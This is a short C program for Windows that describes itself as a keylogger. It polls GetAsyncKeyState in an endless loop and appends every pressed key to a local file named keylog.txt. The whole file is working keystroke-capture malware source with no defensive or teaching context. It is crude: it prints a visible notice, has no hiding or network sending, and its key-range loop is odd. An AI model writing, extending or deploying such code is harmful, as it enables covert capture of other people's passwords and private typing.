#include <stdio.h>
#include <windows.h>

int main() {
    FILE *file = fopen("keylog.txt", "a");
    if (file == NULL) {
        printf("Error al abrir el archivo.\n");
        return 1;
    }

    printf("Keylogger is running. Press Ctrl + C to stop it.\n");

    while (1) {
        for (int i = -1000; i <= 1000; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                switch (i) {
                    case VK_RETURN:
                        fprintf(file, "\n");
                        break;
                    case VK_SPACE:
                        fprintf(file, " ");
                        break;
                    case VK_TAB:
                        fprintf(file, "\t");
                        break;
                    default:
                        fprintf(file, "%c", i);
                        break;
                }
                fflush(file);
            }
        }
    }

    fclose(file);
    return 0;
}